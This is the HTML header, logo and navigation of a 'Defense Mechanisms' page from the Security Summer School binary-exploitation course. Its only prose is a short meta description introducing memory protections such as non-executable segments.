<!doctype html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.85.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="Defense Mechanisms
Introduction
The previous sessions (Shellcodes and Shellcodes Advanced) presented an exploitation scenario that is based on the …"><meta property="og:title" content><meta property="og:description" content="Defense Mechanisms Introduction The previous sessions (Shellcodes and Shellcodes Advanced) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from any memory segment belonging to the process. As you can recall from the Executable File Formats session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:"><meta property="og:type" content="article"><meta property="og:url" content="/binary/defense-mechanisms/"><meta property="article:section" content="binary"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="Defense Mechanisms Introduction The previous sessions (Shellcodes and Shellcodes Advanced) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from any memory segment belonging to the process. As you can recall from the Executable File Formats session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:"><meta itemprop=wordCount content="3733"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="Defense Mechanisms Introduction The previous sessions (Shellcodes and Shellcodes Advanced) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from any memory segment belonging to the process. As you can recall from the Executable File Formats session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed. This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:"><link rel=preload href=/scss/main.min.959cc3579647d04265a1bb70b679a0771e7f7f7050bd3a694c2edd07f32972ca.css as=style><link href=/scss/main.min.959cc3579647d04265a1bb70b679a0771e7f7f7050bd3a694c2edd07f32972ca.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.5.1.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-00000000-0','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-page><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class="text-uppercase font-weight-bold">Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/binary/><span class=active>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/essentials/><span>Security Essentials</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/web/><span>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><aside class="col-12 col-md-3 col-xl-2 td-sidebar d-print-none"><div id=td-sidebar-menu class=td-sidebar__inner><form class="td-sidebar__search d-flex align-items-center"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off>
<button class="btn btn-link td-sidebar__toggle d-md-none p-0 ml-3 fas fa-bars" type=button data-toggle=collapse data-target=#td-section-nav aria-controls=td-docs-nav aria-expanded=false aria-label="Toggle section navigation"></button></form><nav class="collapse td-sidebar-nav" id=td-section-nav><ul class="td-sidebar-nav__section pr-md-3 ul-0"><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-binary-li><a href=/binary/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__section tree-root" id=m-binary><span>Binary Exploitation</span></a><ul class=ul-1><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybuffer-exploitation-li><a href=/binary/buffer-exploitation/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybuffer-exploitation><span>Buffer Exploitation</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-binarydefense-mechanisms-li><a href=/binary/defense-mechanisms/ title class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-binarydefense-mechanisms><span class=td-sidebar-nav-active-item>Defense Mechanisms</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarydynamic-analysis-li><a href=/binary/dynamic-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarydynamic-analysis><span>Dynamic Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexecutables-and-processes-li><a href=/binary/executables-and-processes/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexecutables-and-processes><span>Executables and Processes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryexploration-tools-li><a href=/binary/exploration-tools/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryexploration-tools><span>Exploration Tools</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryinformation-leaks-li><a href=/binary/information-leaks/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryinformation-leaks><span>Information Leaks</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreturn-oriented-programming-li><a href=/binary/return-oriented-programming/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming><span>Return Oriented Programming</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryreturn-oriented-programming-advanced-li><a href=/binary/return-oriented-programming-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryreturn-oriented-programming-advanced><span>Return Oriented Programming Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryshellcodes-li><a href=/binary/shellcodes/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes><span>Shellcodes</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryshellcodes-advanced-li><a href=/binary/shellcodes-advanced/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryshellcodes-advanced><span>Shellcodes Advanced</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarystatic-analysis-li><a href=/binary/static-analysis/ title class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarystatic-analysis><span>Static Analysis</span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/03-tutorial-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities03-tutorial-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/08-challenge-bypass-dep-no-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities08-challenge-bypass-dep-no-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme-li><a href=/binary/bypassing-mitigations/activities/09-challenge-bypass-dep-aslr-libc/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binarybypassing-mitigationsactivities09-challenge-bypass-dep-aslr-libcreadme><span></span></a></li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-binaryextrapwntools-introreadme-li><a href=/binary/extra/pwntools-intro/readme/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-binaryextrapwntools-introreadme><span></span></a></li></ul></li></ul></nav></div></aside><aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none"><div class="td-page-meta ml-2 pb-1 pt-2 mb-0"><a href=https://github.com/security-summer-school/security-summer-school.github.io/edit/master/content/en/binary/defense-mechanisms/index.md target=_blank><i class="fa fa-edit fa-fw"></i> Edit this page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/new/master/content/en/binary/defense-mechanisms/index.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" target=_blank><i class="fa fa-edit fa-fw"></i> Create child page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/issues/new?title=" target=_blank><i class="fab fa-github fa-fw"></i> Create documentation issue</a>
<a href=https://github.com/security-summer-school/issues/new target=_blank><i class="fas fa-tasks fa-fw"></i> Create project issue</a>
